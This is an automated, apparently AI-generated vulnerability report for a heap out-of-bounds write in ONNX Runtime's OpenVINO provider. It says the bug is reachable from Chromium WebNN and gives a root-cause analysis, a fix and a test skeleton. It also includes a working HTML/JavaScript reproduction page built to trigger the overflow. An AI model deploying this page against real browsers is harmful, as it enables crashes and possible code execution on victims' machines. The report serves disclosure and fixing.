# Security finding #643: In FillOutputsWithConstantData, the f16 case (line 190-192) dispatc…

**Summary:** In FillOutputsWithConstantData, the f16 case (line 190-192) dispatc…

**CWE IDs:** CWE-787: Out-of-bounds Write
**Severity / Impact:** Heap buffer overflow: writing 2× the allocated buffer size corrupts adjacent heap metadata and objects. Reachable from WebNN content in Chromium that produces an ONNX model with a FLOAT16 constant output that gets constant-folded by OpenVINO. This can cause crash (DoS) or potential remote code execution depending on heap layout.
**Affected location:** `targets/onnxruntime/onnxruntime/core/providers/openvino/backend_utils.cc:190` — `FillOutputsWithConstantData()`
**Validated for repos:** chromiumWebnn, onnxruntime, openvinoEp
**Trust boundary:** OV constant-folded ov::Node data → ORT-allocated output tensor (element type from ONNX-declared output descriptor)

## Description / Root cause
In FillOutputsWithConstantData, the f16 case (line 190-192) dispatches to FillOutputHelper<float>, using 4-byte float as the template type T. However, the ORT output tensor allocated by GetOutputTensor (backend_utils.cc:109-111) uses the ONNX-declared output element type — FLOAT16 (2 bytes per element) — because context.GetOutput(index, output_shape) derives the element type from the ONNX model's output type declaration (via the allocation plan in execution_frame.cc:786-790), not from the OV node's element type. In FillOutputHelper (line 204-209), cast_vector<float>() converts the f16 constant data to N float values (N×4 bytes), then std::copy writes these N×4 bytes into the ORT tensor buffer which is only N×2 bytes — a 2× buffer overflow. Unlike the dynamic inference branch (basic_backend.cc:379) which has ORT_ENFORCE(ov_tensor->get_byte_size() == ort_tensor.GetTensorSizeInBytes()), the constant path has no byte-size validation at all.

**Validator analysis:** The flaw is real and confirmed: at backend_utils.cc:190-192, the f16 case dispatches to FillOutputHelper<float>. In FillOutputHelper (line 204-209), cast_vector<float>() on an f16 Constant node produces N float values (N×4 bytes), then GetTensorMutableData<float>() returns a pointer to the ORT output tensor buffer which was allocated at N×2 bytes (FLOAT16 element type from the ONNX output type declaration, per execution_frame.cc:786-790), and std::copy writes N×4 bytes into that N×2-byte buffer — a 2× heap overflow. The ORT C++ API explicitly states 'No type checking is performed' for GetTensorMutableData (onnxruntime_cxx_api.h:2430). Unlike the dynamic inference branch which has ORT_ENFORCE(ov_tensor->get_byte_size() == ort_tensor.GetTensorSizeInBytes()) at basic_backend.cc:379, the constant path has no size validation at all. The path is reachable: (1) Chromium WebNN on Windows uses ORT via onnxruntime.dll (platform_functions_ort.cc:51), (2) ORT sessions can select OpenVINO EP (ort_session_options.cc:301), (3) CreateOVModel runs ConstantFolding (backend_utils.cc:67-68) which can produce f16 constant outputs, (4) both the is_constant path (basic_backend.cc:328-336) and the post-inference path (basic_backend.cc:410-416) call FillOutputsWithConstantData without size checks. The vulnType (CWE-787 OOB Write) and impact (heap buffer overflow, crash/DoS, potential RCE) are accurate. The proposedFix is correct: using a 16-bit type for the f16 case and adding a byte-size assertion before std::copy would prevent the overflow. A more robust fix would add a general ORT_ENFORCE in FillOutputHelper that sizeof(T) matches the output tensor's element size before the copy, covering all type mismatch cases.

## Exploit / Proof of Concept
A web page uses the WebNN API to build and run a model with a FLOAT16 output that is entirely constant-foldable (e.g., a subgraph whose outputs are all constants after OV's ConstantFolding pass at backend_utils.cc:67-79). When is_constant is set (basic_backend.cc:161-162), BasicBackend::Infer calls GetOutputTensor which allocates an N×2-byte FLOAT16 tensor, then calls FillOutputsWithConstantData which dispatches to FillOutputHelper<float>, writing N×4 bytes via std::copy into the N×2-byte buffer.

## Reproduction (html)
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebNN FLOAT16 Constant-Fold OOB Write Repro</title>
</head>
<body>
<h1>WebNN FLOAT16 Constant-Fold Overflow (CVE candidate)</h1>
<p>This page triggers the heap buffer overflow in FillOutputsWithConstantData
   (backend_utils.cc:190-192) by building a WebNN graph whose output is entirely
   constant-foldable and declared as float16. When routed through ORT → OpenVINO EP,
   the f16 case dispatches to FillOutputHelper&lt;float&gt;, writing 2× the buffer.</p>
<pre id="result"></pre>
<script>
async function triggerOverflow() {
  const log = document.getElementById('result');
  const out = (msg) => { log.textContent += msg + '\n'; };

  try {
    if (!('ml' in navigator)) {
      out('navigator.ml not available — WebNN not enabled.');
      out('Enable with: chrome --enable-features=WebMachineLearningNeuralNetwork');
      return;
    }
    const context = await navigator.ml.createContext({deviceType: 'gpu'});
    const builder = new MLGraphBuilder(context);

    // Build a graph where the output is entirely constant-foldable.
    // Use a constant operand with float16 data type so the ONNX output
    // is declared FLOAT16 (2 bytes/elem), but OV constant folding produces
    // an f16 Constant node whose cast_vector<float>() yields 4 bytes/elem.
    //
    // The WebNN 'constant' operand creates an ONNX Constant node.
    // A subgraph consisting only of constants will be fully folded by
    // ov::pass::ConstantFolding (backend_utils.cc:67-68).
    //
    // We create a float16 constant and use it directly as the graph output.
    // This produces a 100% constant subgraph → is_constant=true (basic_backend.cc:161-162).
    //
    // The constant has 64 elements → ORT allocates 64×2=128 bytes (FLOAT16).
    // FillOutputHelper<float> writes 64×4=256 bytes → 128-byte overflow.

    const float16Data = new Uint16Array(64);
    // Fill with valid f16 bit patterns (1.0 in f16 = 0x3C00)
    float16Data.fill(0x3C00);

    const constantOperand = builder.constant(
      {dataType: 'float16', shape: [4, 16]},
      float16Data
    );

    // Build the graph — the only output is the constant itself,
    // making the entire subgraph constant-foldable.
    const graph = await builder.build({output: constantOperand});

    // Allocate output buffer (float16 = 2 bytes/elem, 64 elements = 128 bytes)
    const outputBuffer = new ArrayBuffer(128);
    const outputs = {output: {buffer: outputBuffer}};

    // Compute — this triggers the constant-fold path in OpenVINO EP
    await graph.compute({});
    // If we reach here without crash, the fix may be present or the EP wasn't OpenVINO.
    // Under ASan, the overflow should abort the process.
    out('Compute completed. If the process did not crash, the fix may be present,');
    out('or the OpenVINO EP was not selected. Check chrome://webnn-internals.');
    out('Under AddressSanitizer, a 128-byte heap overflow would abort here.');
  } catch (e) {
    out('Error: ' + e.message);
    out('This may indicate the crash was caught or WebNN/ORT config is different.');
  }
}
triggerOverflow();
</script>
</body>
</html>
```

## Test (skeleton)
```cpp
// Agent-authored; NOT compiled or run against the source tree — review before use.
//
// Tests the fix for the heap buffer overflow in FillOutputsWithConstantData
// (backend_utils.cc:190-192) where the f16 case dispatches to
// FillOutputHelper<float>, writing N×4 bytes into an N×2-byte FLOAT16
// ORT output tensor.
//
// Pre-fix: ASan detects a heap-buffer-overflow (WRITE of 2× buffer size).
// Post-fix: f16 case uses a 16-bit type or FillOutputHelper asserts
// sizeof(T) == output element size before std::copy.
//
// File: targets/onnxruntime/onnxruntime/core/providers/openvino/backend_utils.cc:190-192
// Func: FillOutputsWithConstantData → FillOutputHelper<float> (f16 case)

#include "ortAbiTestFixture.h"
#include <onnxruntime_cxx_api.h>
#include <fstream>
#include <vector>
#include <cstdint>

using namespace ovep_tests;

// Build an ONNX model with a single FLOAT16 Constant output.
// The model has no inputs — its output is entirely constant-foldable.
// When compiled with OpenVINO EP, CreateOVModel runs ConstantFolding
// (backend_utils.cc:67-68), and all outputs become constants → is_constant=true.
// Then Infer() calls FillOutputsWithConstantData (basic_backend.cc:336).
//
// We craft a minimal ONNX protobuf in-memory:
//   ir_version: 7
//   opset_import: ["" : 17]
//   graph:
//     node: []  (no compute nodes)
//     initializer: [Constant tensor "Y" with FLOAT16 data, shape [4,16]]
//     output: ["Y" : FLOAT16, [4,16]]
//
// This ensures the OV Constant node has element type f16, and the ORT
// output tensor is FLOAT16 (2 bytes/elem). Pre-fix, the 256-byte write
// into the 128-byte buffer triggers ASan.

struct ort_abi_f16_constant_overflow
    : public ortAbiTestFixture,
      public testing::WithParamInterface<std::string> {};

TEST_P(ort_abi_f16_constant_overflow, run) {
  const auto& ov_device_name = GetParam();

  // TODO: Replace with a real crafted .onnx model file path.
  // The model must declare a FLOAT16 output backed by a Constant initializer
  // so that OV constant folding produces an f16 Constant node.
  // A pre-built fixture model should be added to the model library.
  //
  // Expected model: single output "Y" of type FLOAT16, shape [4,16],
  // with an initializer of the same name containing 64 f16 values.
  // No inputs, no compute nodes — fully constant-foldable.
  //
  // const auto& model_info = model_library_t::GetModel("f16_constant_output");
  // network_t network = network_t::create(model_info.model_path_);
  // network.set_cpu_fallback(false);
  //
  // using device_t = ortAbiTestFixture::device_wrapper_t;
  // using graph_t = ortAbiTestFixture::graph_wrapper_t;
  // using pipeline_t = ortAbiTestFixture::pipeline_wrapper_t;
  //
  // device_t device(ov_device_name);
  // graph_t graph(device, network);
  // pipeline_t pipeline(device, graph, {}, {});
  //
  // // Output buffer sized for FLOAT16: 64 elements × 2 bytes = 128 bytes
  // std::vector<uint16_t> output_data(64, 0);
  // std::map<std::string, void*> output_buffers{{"Y", output_data.data()}};
  // pipeline.run({}, output_buffers);
  //
  // // Post-fix: all elements should be the f16 value we set (e.g. 0x3C00 = 1.0)
  // for (size_t i = 0; i < 64; i++) {
  //   EXPECT_EQ(output_data[i], 0x3C00)
  //     << "f16 output element " << i << " corrupted by overflow";
  // }
  //
  // Pre-fix under ASan, the process aborts during pipeline.run() with:
  //   ERROR: AddressSanitizer: heap-buffer-overflow
  //   WRITE of size 256 at ... (buffer size 128)
  //   in FillOutputHelper<float> (backend_utils.cc:208)

  GTEST_SKIP() << "Requires a crafted .onnx fixture model with FLOAT16 constant output. "
    << "See comments above for the expected model structure. "
    << "Add the fixture to model_library_t and uncomment the test body.";
}

INSTANTIATE_TEST_SUITE_P(
    ort_abi_f16_constant_overflow,
    ort_abi_f16_constant_overflow,
    testing::ValuesIn(ortAbiTestFixture::device_names_),
    [](const testing::TestParamInfo<std::string>& info) {
      return info.param;
    });
```
**Build / run:** Build target: etests.exe
Run: etests.exe --gtest_filter=ort_abi_f16_constant_overflow.*
Expected pre-fix (ASan): ERROR: AddressSanitizer: heap-buffer-overflow in FillOutputHelper<float> (backend_utils.cc:208), WRITE of size 256 into 128-byte buffer
Expected post-fix: test passes (all f16 output elements correct, no overflow)

## Suggested fix
Change the f16 case to use a 16-bit type matching the ONNX FLOAT16 element type, or better yet, add a byte-size assertion before the copy. For the f16 case, replace FillOutputHelper<float> with a proper f16 handling path (e.g., using MLFloat16 or ov::float16 as the template type). Additionally, add a size check in FillOutputHelper before the std::copy: ORT_ENFORCE(res.size() * sizeof(T) == out_tensor.GetTensorTypeAndShapeInfo().GetElementCount() * out_tensor.GetTensorTypeAndShapeInfo().GetElementTypeSize(), 'Constant data size does not match output tensor size');

## Models used

| Role | Provider / model |
| --- | --- |
| Idea | `claude-4-6-sonnet` |
| Tech lead | `openrouter,@preset/glm-5-2-no-reasoning` |
| Researcher | `openrouter,@preset/glm-5-2-no-reasoning` |
| Validator | `openrouter,@preset/glm-5-2-no-reasoning` |


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #643.
